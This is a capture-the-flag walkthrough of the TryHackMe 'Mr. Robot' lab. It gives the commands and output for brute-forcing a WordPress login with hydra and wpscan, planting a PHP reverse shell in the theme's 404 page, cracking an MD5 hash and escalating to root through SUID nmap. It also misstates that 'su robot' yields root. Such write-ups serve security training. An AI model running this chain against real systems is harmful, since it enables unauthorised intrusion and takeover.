
# Author: gr33nm0nk2802
# Note:   This is a walkthrough of the Tryhackme Mr. Robot lab. I would suggest you to definately checkout this awesome lab. Flags haven't been shared
# Link:  (https://tryhackme.com/room/mrrobot)


Note use your own machine IP upon deploying the machine.
'''
	export IP=10.10.108.126
'''

Upon scanning the IP we have:

```(nmap scan)
nmap -sS -sV -vv -Pn $IP
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 61
80/tcp  open   http     syn-ack ttl 61 Apache httpd
443/tcp open   ssl/http syn-ack ttl 61 Apache httpd
``` 

So, we can see web and ssh services running on the machine.

On further visiting the machine we find two locations in robots.txt hidden to the crawlers.

```(robots.txt)
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Upon further ennumeration we find Key1 and a dictonary file.

'''
1. Key 1: 073XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
'''


```(Directory scan)
gobuster dir -u http://10.10.108.126/ -w /usr/share/wordlists/dirb/common.txt

/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/atom (Status: 301)
/audio (Status: 301)
/blog (Status: 301)
/css (Status: 301)
/dashboard (Status: 302)
/favicon.ico (Status: 200)
/feed (Status: 301)
/image (Status: 301)
/Image (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/index.php (Status: 301)
/intro (Status: 200)
/js (Status: 301)
/page1 (Status: 301)
/phpmyadmin (Status: 403)
/rdf (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/sitemap (Status: 200)
/sitemap.xml (Status: 200)
/video (Status: 301)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-config (Status: 200)
/wp-includes (Status: 301)
/wp-cron (Status: 200)
/wp-links-opml (Status: 200)
/wp-load (Status: 200)
/wp-login (Status: 200)
/wp-signup (Status: 302)

```

Upon further ennumeration this turns out to be a wordpress site and we have access to a login page at  (http://10.10.108.126/wp-login/)

Lets bruteforce this login page.


```(hydra)

	hydra -L fsocity.dic  -p test $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=Invalid username"
	
	Username: Elliot
	
	hydra -l Elliot -P fsocity.dic $IP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=The password you entered for the username Elliot is incorrect."

	Password: ER28-0652

```
	Lets login with the credentials now we can also use burpsuite to bruteforce or use wpscan.


```(wp scan)
	wpscan --url http://$IP -t 50 -U elliot -P fsocity_sorted.txt

	_______________________________________________________________
	         __          _______   _____
	         \ \        / /  __ \ / ____|
	          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
	           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
	            \  /\  /  | |     ____) | (__| (_| | | | |
	             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

	         WordPress Security Scanner by the WPScan Team
	                         Version 3.8.2
	       Sponsored by Automattic - https://automattic.com/
	       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
	_______________________________________________________________

	[+] URL: http://10.10.108.126/ [10.10.108.126]
	[+] Started: Wed Jul 15 17:18:41 2020

	Interesting Finding(s):

	[+] Headers
	 | Interesting Entries:
	 |  - Server: Apache
	 |  - X-Mod-Pagespeed: 1.9.32.3-4523
	 | Found By: Headers (Passive Detection)
	 | Confidence: 100%

	[+] http://10.10.108.126/robots.txt
	 | Found By: Robots Txt (Aggressive Detection)
	 | Confidence: 100%

	[+] XML-RPC seems to be enabled: http://10.10.108.126/xmlrpc.php
	 | Found By: Direct Access (Aggressive Detection)
	 | Confidence: 100%
	 | References:
	 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
	 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

	[+] The external WP-Cron seems to be enabled: http://10.10.108.126/wp-cron.php
	 | Found By: Direct Access (Aggressive Detection)
	 | Confidence: 60%
	 | References:
	 |  - https://www.iplocation.net/defend-wordpress-from-ddos
	 |  - https://github.com/wpscanteam/wpscan/issues/1299

	[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
	 | Found By: Emoji Settings (Passive Detection)
	 |  - http://10.10.108.126/bcd5448.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
	 | Confirmed By: Meta Generator (Passive Detection)
	 |  - http://10.10.108.126/bcd5448.html, Match: 'WordPress 4.3.1'

	[+] WordPress theme in use: twentyfifteen
	 | Location: http://10.10.108.126/wp-content/themes/twentyfifteen/
	 | Last Updated: 2020-03-31T00:00:00.000Z
	 | Readme: http://10.10.108.126/wp-content/themes/twentyfifteen/readme.txt
	 | [!] The version is out of date, the latest version is 2.6
	 | Style URL: http://10.10.108.126/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
	 | Style Name: Twenty Fifteen
	 | Style URI: https://wordpress.org/themes/twentyfifteen/
	 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
	 | Author: the WordPress team
	 | Author URI: https://wordpress.org/
	 |
	 | Found By: Css Style In 404 Page (Passive Detection)
	 |
	 | Version: 1.3 (80% confidence)
	 | Found By: Style (Passive Detection)
	 |  - http://10.10.108.126/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

	[+] Enumerating All Plugins (via Passive Methods)

	[i] No plugins Found.

	[+] Enumerating Config Backups (via Passive and Aggressive Methods)
	 Checking Config Backups - Time: 00:00:01 <=========================================================================> (21 / 21) 100.00% Time: 00:00:01

	[i] No Config Backups Found.

	[+] Performing password attack on Xmlrpc Multicall against 1 user/s
	[SUCCESS] - 
	elliot ER28-0652                                                                                                                          
	All Found                      

```	

Next as we are able to login to the admin-panel we will modify the 404 error page to get a reverse shell

we user the webshell located in kali

```(webshell)
locate php-reverse-shell.php
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
```

we modify the ip and port to our ip and port and then start listening on netcat for connections.

```(netcat server)
	nc -nlvp 4000
```

next we visit to any random page on http://$IP/random
and our reverse shell is executed.


Getting proper terminal from rawshell

```(proper shell using python)
	
	python -c 'import pty; pty.spawn("/bin/bash")'

```


After getting this terminal we locate the filesystem and find two interesting files in (/home/robot) directory.

we have a key file and a password file with hash. We can see the password but not the key file.
so, lets crack the md5-hash using hashcat or john and rockyou.txt wordlist.

```(cracking hash)

	echo "c3fcd3d76192e4007dfb496cca67e13b" > hash2.txt
	hash-identifier c3fcd3d76192e4007dfb496cca67e13b
	hashcat -m0 --force hash2.txt /usr/share/wordlists/rockyou.txt

```

After this we get the password for the user robot and we can use su robot to gain root access and read key2-of-3.txt


'''
	Key 2: 822XXXXXXXXXXXXXXXXXXXXXXXXX
'''

Priviledge Esclation:

Now lets look for files which have the setuid bit set for the user to get the flag on /root

```(setuid enum)

	find / -perm -u=s -type f 2>/dev/null

```

 some of the existing binaries and utilities can be used to escalate privileges to root if they have the SUID permission. Known Linux executables that can allow privilege escalation are:

  -  Nmap
  - Vim
  - find
  - Bash
  - More
  - Less
  - Nano
  - cp

  Esclating priviledge :

  ```(nmap interactive)
	
	nmap --interactive
	nmap> !sh

  ```

  Bingo we have our root shell.

  Move to cd /root

'''
	Key 3: 047XXXXXXXXXXXXXXXXXXXXXXX
'''